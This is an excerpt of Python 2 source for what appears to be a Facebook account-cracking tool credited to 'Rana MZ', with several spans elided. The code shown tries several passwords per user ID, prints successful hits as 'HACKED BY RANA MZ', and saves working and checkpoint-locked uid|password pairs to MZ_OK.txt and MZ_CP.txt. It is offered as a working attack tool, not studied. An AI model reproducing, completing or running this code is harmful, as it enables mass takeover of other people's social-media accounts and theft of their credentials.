...
def menu():
    ...
    try:
        ...
        print logo
        print ''
        print '\t Logged in id has CP\x1b[0;97m'
        print ''
    ...
    print ' ------------------------------------------ '
    print ''
    print '[1]  with auto pass'
    print '[2]  with choice pass'
    print '[3] View token'
    print '[4] Logout'
...
def a_s():
    ...
    print 47 * '-'
    print ''
    print '\t\x1b[1;32mCreated by: Rana MZ\x1b[0;97m'
    print ''
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;32m[HACKED BY RANA MZ] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '[MZ - CP] ' + uid + ' | ' + pass1
                cp = open('MZ_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;32m[HACKED BY RANA MZ] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '[MZ - CP] ' + uid + ' | ' + pass2
                    cp = open('MZ_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;32m[HACKED BY RANA MZ] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '[MZ - CP] ' + uid + ' | ' + pass3
                        cp = open('MZ_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;32m[HACKED BY RANA MZ] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '[MZ - CP] ' + uid + ' | ' + pass4
                            cp = open('MZ_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
